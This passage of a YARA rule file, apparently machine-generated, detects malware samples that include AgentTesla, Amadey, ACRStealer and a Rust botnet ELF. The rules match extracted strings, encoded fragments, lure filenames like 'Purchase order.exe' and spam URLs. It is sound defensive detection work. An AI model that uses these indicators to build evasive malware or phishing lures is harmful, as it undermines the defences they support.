      hash1 = "9f4e98d10a0951edaa4f4061b06cf3ff0ca87af4cd417fdb5a59e5dcad5ee0d0"
   strings:
      $s1 = "/URI (http://myftpupload.com)" fullword ascii /* score: '24.00'*/
      $s2 = "<rdf:Description xmlns:xmp=\"http://ns.adobe.com/xap/1.0/\">" fullword ascii /* score: '23.00'*/
      $s3 = "<rdf:Description xmlns:pdf=\"http://ns.adobe.com/pdf/1.3/\">" fullword ascii /* score: '23.00'*/
      $s4 = "/URI (http://robinhantersisgood2.blogspot.com)" fullword ascii /* score: '22.00'*/
      $s5 = "/URI (http://sps-system.com)" fullword ascii /* score: '20.00'*/
      $s6 = "/URI (http://buscandonovasaguas.com)" fullword ascii /* score: '18.00'*/
      $s7 = "/URI (http://fiestastforum.com)" fullword ascii /* score: '17.00'*/
      $s8 = "/URI (http://genieo.com)" fullword ascii /* score: '17.00'*/
      $s9 = "/URI (http://shwelayoung.com)" fullword ascii /* score: '17.00'*/
      $s10 = "/URI (http://aphroditeporntube.com)" fullword ascii /* score: '17.00'*/
      $s11 = "/URI (http://overclockers.com.au)" fullword ascii /* score: '17.00'*/
      $s12 = "/URI (http://zuoche.com)" fullword ascii /* score: '17.00'*/
      $s13 = "/URI (http://badgirlsbible.com)" fullword ascii /* score: '17.00'*/
      $s14 = "/URI (http://tubetip.com)" fullword ascii /* score: '17.00'*/
      $s15 = "/URI (http://xiangrikui.com)" fullword ascii /* score: '17.00'*/
   condition:
      uint16(0) == 0x5025 and filesize < 200KB and
      8 of them
}

rule sig_884310b1928934402ea6fec1dbd3cf5e_imphash_ {
   meta:
      description = "_subset_batch - file 884310b1928934402ea6fec1dbd3cf5e(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "ed6cced1455da62596505f30a88c6728c7ef1da1ca94ab12453688dcdffedeb1"
   strings:
      $s1 = "            <requestedExecutionLevel level=\"asInvoker\"            uiAccess=\"false\"/>" fullword ascii /* score: '15.00'*/
      $s2 = "    <asmv3:windowsSettings xmlns=\"http://schemas.microsoft.com/SMI/2005/WindowsSettings\">" fullword ascii /* score: '12.00'*/
      $s3 = "    processorArchitecture=\"x86\"" fullword ascii /* score: '10.00'*/
      $s4 = "            processorArchitecture=\"x86\"" fullword ascii /* score: '10.00'*/
      $s5 = "            publicKeyToken=\"6595b64144ccf1df\"" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      all of them
}

rule sig_884310b1928934402ea6fec1dbd3cf5e_imphash__c3f033fe {
   meta:
      description = "_subset_batch - file 884310b1928934402ea6fec1dbd3cf5e(imphash)_c3f033fe.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "c3f033fe7e509e82f0f38e4f15e0021cb44bc651c8676116098220a0439f360b"
   strings:
      $s1 = "            <requestedExecutionLevel level=\"asInvoker\"            uiAccess=\"false\"/>" fullword ascii /* score: '15.00'*/
      $s2 = "        <dpiAware xmlns=\"http://schemas.microsoft.com/SMI/2005/WindowsSettings\">true</dpiAware>" fullword ascii /* score: '12.00'*/
      $s3 = "    processorArchitecture=\"x86\"" fullword ascii /* score: '10.00'*/
      $s4 = "            processorArchitecture=\"x86\"" fullword ascii /* score: '10.00'*/
      $s5 = "            publicKeyToken=\"6595b64144ccf1df\"" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 300KB and
      all of them
}

rule AgentTesla_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__9967e313 {
   meta:
      description = "_subset_batch - file AgentTesla(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_9967e313.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "9967e313faf2ba6e1de18e7a4a8d7134cca1701f51e41d913a93370577a583ab"
   strings:
      $s1 = "DSsnoserV3.exe" fullword ascii /* score: '22.00'*/
      $s2 = "CorelDRAW.exe" fullword wide /* score: '22.00'*/
      $s3 = "dwProcessHandle" fullword ascii /* score: '15.00'*/
      $s4 = "<StartAsBypass>b__10_0" fullword ascii /* score: '15.00'*/
      $s5 = "UzJzOyNhSGE" fullword ascii /* base64 encoded string 'S2s;#aHa' */ /* score: '14.00'*/
      $s6 = "lNHloaCBYOFz" fullword ascii /* base64 encoded string '4yhh X8\' */ /* score: '14.00'*/
      $s7 = "LdDkqdXBl" fullword ascii /* base64 encoded string 't9*upe' */ /* score: '14.00'*/
      $s8 = "WUptJktqNU" fullword ascii /* base64 encoded string 'YJm&Kj5' */ /* score: '14.00'*/
      $s9 = "fADh1SnggYi5N" fullword wide /* base64 encoded string ' 8uJx b.M' */ /* score: '14.00'*/
      $s10 = "VwdckPIZsPYCfJg" fullword ascii /* score: '9.00'*/
      $s11 = "ftjCoweYe" fullword ascii /* score: '9.00'*/
      $s12 = "OWbkMeYEl" fullword ascii /* score: '9.00'*/
      $s13 = "uCmSEyeSURP" fullword ascii /* score: '9.00'*/
      $s14 = "oKreYegXvMjIGr" fullword ascii /* score: '9.00'*/
      $s15 = "rtvfgNEggeTc" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 1000KB and
      8 of them
}

rule AgentTesla_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__c774a62f {
   meta:
      description = "_subset_batch - file AgentTesla(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_c774a62f.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "c774a62fa56e4930e80406e63c6d93e84fc62d991575d9f53832229fc12a6aa5"
   strings:
      $s1 = "adwcleaner.exe" fullword ascii /* score: '22.00'*/
      $s2 = "uhttp://www.microsoft.com/pkiops/certs/Microsoft%20Identity%20Verification%20Root%20Certificate%20Authority%202020.crt0-" fullword ascii /* score: '19.00'*/
      $s3 = "uhttp://www.microsoft.com/pkiops/certs/Microsoft%20Identity%20Verification%20Root%20Certificate%20Authority%202020.crt0" fullword ascii /* score: '19.00'*/
      $s4 = "shttp://www.microsoft.com/pkiops/crl/Microsoft%20Identity%20Verification%20Root%20Certificate%20Authority%202020.crl0" fullword ascii /* score: '19.00'*/
      $s5 = "!http://oneocsp.microsoft.com/ocsp0" fullword ascii /* score: '17.00'*/
      $s6 = "!http://oneocsp.microsoft.com/ocsp0f" fullword ascii /* score: '17.00'*/
      $s7 = "]http://www.microsoft.com/pkiops/certs/Microsoft%20Public%20RSA%20Timestamping%20CA%202020.crt0" fullword ascii /* score: '16.00'*/
      $s8 = "[http://www.microsoft.com/pkiops/crl/Microsoft%20Public%20RSA%20Timestamping%20CA%202020.crl0y" fullword ascii /* score: '16.00'*/
      $s9 = "dwProcessHandle" fullword ascii /* score: '15.00'*/
      $s10 = "<StartAsBypass>b__10_0" fullword ascii /* score: '15.00'*/
      $s11 = "http://ocsp.digicert.com0]" fullword ascii /* score: '14.00'*/
      $s12 = "fOXQDUMPIdO" fullword ascii /* score: '14.00'*/
      $s13 = "rVlwoQGxD" fullword ascii /* base64 encoded string 'V\(@lC' */ /* score: '14.00'*/
      $s14 = "pZjhHQUEh" fullword ascii /* base64 encoded string 'f8GAA!' */ /* score: '14.00'*/
      $s15 = "jTFZITXpb" fullword ascii /* base64 encoded string 'LVHMz[' */ /* score: '14.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      8 of them
}

rule sig_946ce29d2d70e1119ca16e6329a6d21f466d2c66ffca93a037245c8cac3a7c66_946ce29d {
   meta:
      description = "_subset_batch - file 946ce29d2d70e1119ca16e6329a6d21f466d2c66ffca93a037245c8cac3a7c66_946ce29d.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "946ce29d2d70e1119ca16e6329a6d21f466d2c66ffca93a037245c8cac3a7c66"
   strings:
      $s1 = "No child process" fullword ascii /* score: '15.00'*/
      $s2 = "[selfrep] found a faith - %d" fullword ascii /* score: '12.00'*/
      $s3 = "Remote I/O error" fullword ascii /* score: '10.00'*/
      $s4 = "No file descriptors available" fullword ascii /* score: '10.00'*/
      $s5 = "src/floods/packet_build.rs" fullword ascii /* score: '9.00'*/
      $s6 = "__vdso_clock_gettime" fullword ascii /* score: '9.00'*/
      $s7 = "__vdso_clock_gettime64" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 400KB and
      all of them
}

rule sig_9a4ec75e115c1f8976142fe6c4c02388e145c5ad656cd65b4109032401634011_9a4ec75e {
   meta:
      description = "_subset_batch - file 9a4ec75e115c1f8976142fe6c4c02388e145c5ad656cd65b4109032401634011_9a4ec75e.rar"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "9a4ec75e115c1f8976142fe6c4c02388e145c5ad656cd65b4109032401634011"
   strings:
      $s1 = "Jdist_public-25-09-10/dist_public-25-09-10/Unsuru-v4.9.71-PublicRelease.exe" fullword ascii /* score: '22.00'*/
      $s2 = "=dist_public-25-09-10/dist_public-25-09-10/tools/koolo-map.exe" fullword ascii /* score: '22.00'*/
      $s3 = "<dist_public-25-09-10/dist_public-25-09-10/tools/handle64.exe" fullword ascii /* score: '22.00'*/
      $s4 = "\\dist_public-25-09-10/dist_public-25-09-10/config/template/template/pickit_leveling/quest.nip" fullword ascii /* score: '18.00'*/
      $s5 = "Jdist_public-25-09-10/dist_public-25-09-10/config/template/pickit/white.nip" fullword ascii /* score: '17.00'*/
      $s6 = "Vdist_public-25-09-10/dist_public-25-09-10/config/template/pickit_leveling/leveling.nip" fullword ascii /* score: '17.00'*/
      $s7 = "Sdist_public-25-09-10/dist_public-25-09-10/config/template/template/pickit/magic.nip" fullword ascii /* score: '17.00'*/
      $s8 = "Sdist_public-25-09-10/dist_public-25-09-10/config/template/template/pickit/white.nip" fullword ascii /* score: '17.00'*/
      $s9 = "Ldist_public-25-09-10/dist_public-25-09-10/config/template/pickit/crafted.nip" fullword ascii /* score: '17.00'*/
      $s10 = "Jdist_public-25-09-10/dist_public-25-09-10/config/template/pickit/magic.nip" fullword ascii /* score: '17.00'*/
      $s11 = "Kdist_public-25-09-10/dist_public-25-09-10/config/template/pickit/unique.nip" fullword ascii /* score: '17.00'*/
      $s12 = "Idist_public-25-09-10/dist_public-25-09-10/config/template/pickit/unid.nip" fullword ascii /* score: '17.00'*/
      $s13 = "Qdist_public-25-09-10/dist_public-25-09-10/config/template/template/pickit/set.nip" fullword ascii /* score: '17.00'*/
      $s14 = "Rdist_public-25-09-10/dist_public-25-09-10/config/template/template/pickit/unid.nip" fullword ascii /* score: '17.00'*/
      $s15 = "Tdist_public-25-09-10/dist_public-25-09-10/config/template/template/pickit/unique.nip" fullword ascii /* score: '17.00'*/
   condition:
      uint16(0) == 0x6152 and filesize < 18000KB and
      8 of them
}

rule a3__Logger_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__0c4ddbd6 {
   meta:
      description = "_subset_batch - file a3--Logger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_0c4ddbd6.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "0c4ddbd6eaf2b8f542d80ac82433f743b694a637a508ed91c4b4a1d5a0996f7c"
   strings:
      $s1 = "Purchase order.exe" fullword wide /* score: '19.00'*/
      $s2 = "ket0zLie7MBi3rGWoeZu17Pdg+F03bCRrus8/7iHh/xzyqSyseFi1b+fu6lg3amshOdr1JOSr/c8162si/xiyaiSrvtzweaUp+ZY9LidpeZvg5qWtsZ+yLi1sP1q8Lyd" wide /* score: '11.00'*/
      $s3 = "* ^DW~W" fullword ascii /* score: '9.00'*/
      $s4 = "Ohcftp" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      all of them
}

rule ACRStealer_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash_ {
   meta:
      description = "_subset_batch - file ACRStealer(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "8753968482ef91fe499489d0d3e3add91fe90f49b98f347793e654da937edaeb"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"utf-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '33.00'*/
      $s2 = "acr-GETWELL-myrudnah.14u_.exe" fullword wide /* score: '24.00'*/
      $s3 = "acr-GETWELL-myrudnah.14u_" fullword wide /* score: '9.00'*/
      $s4 = "feffefeeffe" ascii /* score: '8.00'*/
      $s5 = "ffefeeffea" ascii /* score: '8.00'*/
      $s6 = "feffeefefa" ascii /* score: '8.00'*/
      $s7 = "fefefeffeef" ascii /* score: '8.00'*/
      $s8 = "ffefeeffe" ascii /* score: '8.00'*/
      $s9 = "feffeefef" ascii /* score: '8.00'*/
      $s10 = "affeeffefea" ascii /* score: '8.00'*/
      $s11 = "xfefefeffeef" fullword ascii /* score: '8.00'*/
      $s12 = "ffeeffeefef" ascii /* score: '8.00'*/
      $s13 = "fefeffefefe" ascii /* score: '8.00'*/
      $s14 = "xfeffeefef" fullword ascii /* score: '8.00'*/
      $s15 = "affefefeeffe" ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      1 of ($x*) and 4 of them
}

rule a3__Logger_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__8604b969 {
   meta:
      description = "_subset_batch - file a3--Logger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_8604b969.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "8604b969a685adc71e4f021b58caf01b3cc61b51ee292fe3257dab9cfe2e166c"
   strings:
      $x1 = "sYgcdvgJl/SfqIMcHzF0kj0tesjCUv5pgTjmsNcULhRKwEY7gI9t41Ag26FqEWfqIAkGi2itY5jpldD5Em1ApfLjt+NqsuIK5L2/QbjzJLpafau8W64tWMSaP8rQ+whb" wide /* score: '62.00'*/
      $x2 = "fSystem.Drawing.Icon, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3ajSystem.CodeDom.MemberAtt" ascii /* score: '32.00'*/
      $x3 = "fSystem.Drawing.Icon, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3ajSystem.CodeDom.MemberAtt" ascii /* score: '32.00'*/
      $s4 = "ersion=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089fSystem.Drawing.Size, System.Drawing, Version=4.0.0.0, Culture=n" ascii /* score: '24.00'*/
      $s5 = "ributes, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089mSystem.Globalization.CultureInfo, mscorlib, V" ascii /* score: '24.00'*/
      $s6 = "j0vq0q1fFL4fnDABpn.K9ywHIrpA2CVyBNchx+JEHtaZEeu67JyvIMwV+V91fyQKtRjSwAumUgD`1[[System.Object, mscorlib, Version=4.0.0.0, Culture" ascii /* score: '24.00'*/
      $s7 = "2222.exe" fullword wide /* score: '19.00'*/
      $s8 = "j0vq0q1fFL4fnDABpn.K9ywHIrpA2CVyBNchx+JEHtaZEeu67JyvIMwV+V91fyQKtRjSwAumUgD`1[[System.Object, mscorlib, Version=4.0.0.0, Culture" ascii /* score: '15.00'*/
      $s9 = " System.Globalization.CompareInfo" fullword ascii /* score: '14.00'*/
      $s10 = "YjE2ZDQ3aW1rNnB2YWJ0Yw==" fullword wide /* base64 encoded string 'b16d47imk6pvabtc' */ /* score: '14.00'*/
      $s11 = "WnYvMkZKN2p0UHpzYkxYVg==" fullword wide /* base64 encoded string 'Zv/2FJ7jtPzsbLXV' */ /* score: '14.00'*/
      $s12 = "=neutral, PublicKeyToken=b77a5c561934e089]][]" fullword ascii /* score: '13.00'*/
      $s13 = "eutral, PublicKeyToken=b03f5f7f11d50a3a" fullword ascii /* score: '13.00'*/
      $s14 = " System.Globalization.SortVersion" fullword ascii /* score: '10.00'*/
      $s15 = "SGeTqoYaySJAX8O2bHu" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      1 of ($x*) and 4 of them
}

rule AgentTesla_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__a6bd7658 {
   meta:
      description = "_subset_batch - file AgentTesla(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_a6bd7658.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "a6bd76580c2b907fa0b7dac1abfaeaf4c4e97930bcc8518338de2160cdf10dc2"
   strings:
      $x1 = "sYgcdvgJl/SfqIMcHzF0kj0tesjCUv5pgTjmsNcULhRKwEY7gI9t41Ag26FqEWfqWNwqwB3hTrE2t/r9naarU4Ihm4EFhOm9vTdAgpVVfBPYBdzVkvHb949lssWbckdT" wide /* score: '59.00'*/
      $x2 = "fSystem.Drawing.Icon, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3ajSystem.CodeDom.MemberAtt" ascii /* score: '32.00'*/
      $x3 = "fSystem.Drawing.Icon, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3ajSystem.CodeDom.MemberAtt" ascii /* score: '32.00'*/
      $s4 = "CCRmgtxyTPBx1tSVPc.UxdxGG1y1pinAYTUJU+Yv3wTUZW3DsVGB7Uus+MD6Ey7nei2ZnLdwmwI`1[[System.Object, mscorlib, Version=4.0.0.0, Culture" ascii /* score: '27.00'*/
      $s5 = "ersion=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089fSystem.Drawing.Size, System.Drawing, Version=4.0.0.0, Culture=n" ascii /* score: '24.00'*/
      $s6 = "ributes, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089mSystem.Globalization.CultureInfo, mscorlib, V" ascii /* score: '24.00'*/
      $s7 = "order pdf.exe" fullword wide /* score: '19.00'*/
      $s8 = "CCRmgtxyTPBx1tSVPc.UxdxGG1y1pinAYTUJU+Yv3wTUZW3DsVGB7Uus+MD6Ey7nei2ZnLdwmwI`1[[System.Object, mscorlib, Version=4.0.0.0, Culture" ascii /* score: '18.00'*/
      $s9 = " System.Globalization.CompareInfo" fullword ascii /* score: '14.00'*/
      $s10 = "YjE2ZDQ3aW1rNnB2YWJ0Yw==" fullword wide /* base64 encoded string 'b16d47imk6pvabtc' */ /* score: '14.00'*/
      $s11 = "WnYvMkZKN2p0UHpzYkxYVg==" fullword wide /* base64 encoded string 'Zv/2FJ7jtPzsbLXV' */ /* score: '14.00'*/
      $s12 = "=neutral, PublicKeyToken=b77a5c561934e089]][]" fullword ascii /* score: '13.00'*/
      $s13 = "eutral, PublicKeyToken=b03f5f7f11d50a3a" fullword ascii /* score: '13.00'*/
      $s14 = " System.Globalization.SortVersion" fullword ascii /* score: '10.00'*/
      $s15 = "typemdt" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      1 of ($x*) and 4 of them
}

rule AgentTesla_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__d1a20e48 {
   meta:
      description = "_subset_batch - file AgentTesla(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_d1a20e48.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "d1a20e48eeb834ff591cb44a5cceebd9db2edd6e54601a2d4bf06e2692b0083a"
   strings:
      $x1 = "sYgcdvgJl/SfqIMcHzF0kj0tesjCUv5pgTjmsNcULhRKwEY7gI9t41Ag26FqEWfqWNwqwB3hTrE2t/r9naarU4Ihm4EFhOm9vTdAgpVVfBPYBdzVkvHb949lssWbckdT" wide /* score: '56.00'*/
      $x2 = "fSystem.Drawing.Icon, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3ajSystem.CodeDom.MemberAtt" ascii /* score: '32.00'*/
      $x3 = "fSystem.Drawing.Icon, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3ajSystem.CodeDom.MemberAtt" ascii /* score: '32.00'*/
      $s4 = "o5YtiwCCTq4sgj16O0.apDC9t6MUcYoa6A354+CP0Ah3NDi1uCcOLr4f+DwkWoae8yfv9EuKCyx`1[[System.Object, mscorlib, Version=4.0.0.0, Culture" ascii /* score: '27.00'*/
      $s5 = "ersion=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089fSystem.Drawing.Size, System.Drawing, Version=4.0.0.0, Culture=n" ascii /* score: '24.00'*/
      $s6 = "ributes, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089mSystem.Globalization.CultureInfo, mscorlib, V" ascii /* score: '24.00'*/
      $s7 = "order pdf.exe" fullword wide /* score: '19.00'*/
      $s8 = "o5YtiwCCTq4sgj16O0.apDC9t6MUcYoa6A354+CP0Ah3NDi1uCcOLr4f+DwkWoae8yfv9EuKCyx`1[[System.Object, mscorlib, Version=4.0.0.0, Culture" ascii /* score: '18.00'*/
      $s9 = " System.Globalization.CompareInfo" fullword ascii /* score: '14.00'*/
      $s10 = "YjE2ZDQ3aW1rNnB2YWJ0Yw==" fullword wide /* base64 encoded string 'b16d47imk6pvabtc' */ /* score: '14.00'*/
      $s11 = "WnYvMkZKN2p0UHpzYkxYVg==" fullword wide /* base64 encoded string 'Zv/2FJ7jtPzsbLXV' */ /* score: '14.00'*/
      $s12 = "yTUkqM0tb" fullword ascii /* base64 encoded string 'MI*3K[' */ /* score: '14.00'*/
      $s13 = "=neutral, PublicKeyToken=b77a5c561934e089]][]" fullword ascii /* score: '13.00'*/
      $s14 = "eutral, PublicKeyToken=b03f5f7f11d50a3a" fullword ascii /* score: '13.00'*/
      $s15 = "N25GajhGF" fullword ascii /* base64 encoded string '7nFj8F' */ /* score: '11.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      1 of ($x*) and 4 of them
}

rule AgentTesla_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__f45b912a {
   meta:
      description = "_subset_batch - file AgentTesla(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_f45b912a.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "f45b912a4b11f3294aabb69e6f533055bf6363fe91cb2b743d927abf0e748f4a"
   strings:
      $x1 = "sYgcdvgJl/SfqIMcHzF0kj0tesjCUv5pgTjmsNcULhRKwEY7gI9t41Ag26FqEWfqWNwqwB3hTrE2t/r9naarU4Ihm4EFhOm9vTdAgpVVfBPYBdzVkvHb949lssWbckdT" wide /* score: '69.00'*/
      $x2 = "fSystem.Drawing.Icon, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3ajSystem.CodeDom.MemberAtt" ascii /* score: '32.00'*/
      $x3 = "fSystem.Drawing.Icon, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3ajSystem.CodeDom.MemberAtt" ascii /* score: '32.00'*/
      $s4 = "ersion=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089fSystem.Drawing.Size, System.Drawing, Version=4.0.0.0, Culture=n" ascii /* score: '24.00'*/
      $s5 = "ributes, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089mSystem.Globalization.CultureInfo, mscorlib, V" ascii /* score: '24.00'*/
      $s6 = "o5bGVJCRFR7e8b1eZ1.Lv27jVXJI20rVfa7lo+LbQ9S4rl5OMyOd1lYL+ECGCVKaAkkrAXjNF6G`1[[System.Object, mscorlib, Version=4.0.0.0, Culture" ascii /* score: '24.00'*/
      $s7 = "order.exe" fullword wide /* score: '22.00'*/
      $s8 = "o5bGVJCRFR7e8b1eZ1.Lv27jVXJI20rVfa7lo+LbQ9S4rl5OMyOd1lYL+ECGCVKaAkkrAXjNF6G`1[[System.Object, mscorlib, Version=4.0.0.0, Culture" ascii /* score: '15.00'*/
      $s9 = " System.Globalization.CompareInfo" fullword ascii /* score: '14.00'*/
      $s10 = "YjE2ZDQ3aW1rNnB2YWJ0Yw==" fullword wide /* base64 encoded string 'b16d47imk6pvabtc' */ /* score: '14.00'*/
      $s11 = "WnYvMkZKN2p0UHpzYkxYVg==" fullword wide /* base64 encoded string 'Zv/2FJ7jtPzsbLXV' */ /* score: '14.00'*/
      $s12 = "=neutral, PublicKeyToken=b77a5c561934e089]][]" fullword ascii /* score: '13.00'*/
      $s13 = "eutral, PublicKeyToken=b03f5f7f11d50a3a" fullword ascii /* score: '13.00'*/
      $s14 = " System.Globalization.SortVersion" fullword ascii /* score: '10.00'*/
      $s15 = "WRVBDkGdJnkDiRc0AL" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      1 of ($x*) and 4 of them
}

rule AgentTesla_signature__7c2c71dfce9a27650634dc8b1ca03bf0_imphash_ {
   meta:
      description = "_subset_batch - file AgentTesla(signature)_7c2c71dfce9a27650634dc8b1ca03bf0(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "774d0d72b093ac1da3eb76af471b1e21e1cd0f36e5a80a429e7e51c623eefdeb"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $x2 = "<assemblyIdentity version=\"1.0.0.0\" processorArchitecture=\"*\" name=\"Nullsoft.NSIS.exehead\" type=\"win32\"/><description>Nu" ascii /* score: '31.00'*/
      $s3 = "ntrols\" version=\"6.0.0.0\" processorArchitecture=\"*\" publicKeyToken=\"6595b64144ccf1df\" language=\"*\" /></dependentAssembl" ascii /* score: '25.00'*/
      $s4 = "dency><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivileges><requestedExecutionLevel level=\"asIn" ascii /* score: '22.00'*/
      $s5 = "http://ocsp.digicert.com0]" fullword ascii /* score: '14.00'*/
      $s6 = "Qhttp://cacerts.digicert.com/DigiCertTrustedG4TimeStampingRSA4096SHA2562025CA1.crt0_" fullword ascii /* score: '13.00'*/
      $s7 = "Nhttp://crl3.digicert.com/DigiCertTrustedG4TimeStampingRSA4096SHA2562025CA1.crl0 " fullword ascii /* score: '13.00'*/
      $s8 = "nstall System v3.05</description><dependency><dependentAssembly><assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common" ascii /* score: '13.00'*/
      $s9 = "er\" uiAccess=\"false\"/></requestedPrivileges></security></trustInfo><compatibility xmlns=\"urn:schemas-microsoft-com:compatibi" ascii /* score: '10.00'*/
      $s10 = "CRYPTBASE" fullword ascii /* score: '8.50'*/
      $s11 = "rrrrntw" fullword ascii /* score: '8.00'*/
      $s12 = "losnqrr" fullword ascii /* score: '8.00'*/
      $s13 = "pvwwpwwww" fullword ascii /* score: '8.00'*/
      $s14 = "xwwxtwwwwwwwww" fullword ascii /* score: '8.00'*/
      $s15 = "jloyipt" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      1 of ($x*) and 4 of them
}

rule Amadey_signature__2 {
   meta:
      description = "_subset_batch - file Amadey(signature).msi"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "bcc062030c3615d3f8e42e3a2a0b4410e07cf5c845c72c95b56d41d81bac5f46"
   strings:
      $x1 = "TableTypeComponent_FileYQZU4zBKBP1D3.3.1.01033LanguageFileNameVersionuofnxj8d.hw|Kreadsaed.hwptMBchsnD76XqBugSplat.dll45scczy1.e" ascii /* score: '57.00'*/
      $x2 = "pe, consisting of source location, code type, entry, option flags.CustomSourceThe table reference of the source of the code.Form" ascii /* score: '43.00'*/
      $s3 = "eaturesPublishProductInstallUISequenceValidateProductIDInstallExecuteSequenceProcessComponentsUnpublishFeaturesRemoveFilesRemove" ascii /* score: '29.00'*/
      $s4 = "ature_ParentTitleDescriptionDisplayLevelAmorosoFeatureCustomActionActionSourceTargetExtendedTypeLaunchFileFeatureComponentsFeatu" ascii /* score: '23.00'*/
      $s5 = "TableTypeComponent_FileYQZU4zBKBP1D3.3.1.01033LanguageFileNameVersionuofnxj8d.hw|Kreadsaed.hwptMBchsnD76XqBugSplat.dll45scczy1.e" ascii /* score: '22.00'*/
      $s6 = "roductVersion7.1.5.0UpgradeCode{56BFAF08-1672-4176-BFEC-B0F10AFD12EA}AdminUISequenceCostInitializeFileCostCostFinalizeExecuteAct" ascii /* score: '21.00'*/
      $s7 = "8BC}{F24BCB1A-6715-5DAA-B138-F72EEF9C6914}DirectoryDirectory_ParentDefaultDirLocalAppDataFolderPilauTARGETDIR.SourceDirFeatureFe" ascii /* score: '20.00'*/
      $s8 = "ionAdminExecuteSequenceInstallValidateInstallInitializeInstallAdminPackageInstallFilesInstallFinalizeAdvtExecuteSequencePublishF" ascii /* score: '18.00'*/
      $s9 = "xe|PipeDebug52.exeSequenceAttributesFileSizeakWPY2JHpvHhefa3wjm.rus|Waing.rusvzX38xj5eHComponentComponentIdDirectory_ConditionKe" ascii /* score: '17.00'*/
      $s10 = "es a root item.TextShort text identifying a visible feature item.Longer descriptive text describing a visible feature item.Numer" ascii /* score: '16.00'*/
      $s11 = "root of the install tree.The default sub-path under parent's path.Primary key used to identify a particular feature record.Optio" ascii /* score: '16.00'*/
      $s12 = "t either by the AppSearch action or with the default setting obtained from the Directory table.Remote execution option, one of i" ascii /* score: '15.00'*/
      $s13 = "erminate, returning iesBadActionData.Number that determines the sort order in which the actions are to be executed.  Leave blank" ascii /* score: '14.00'*/
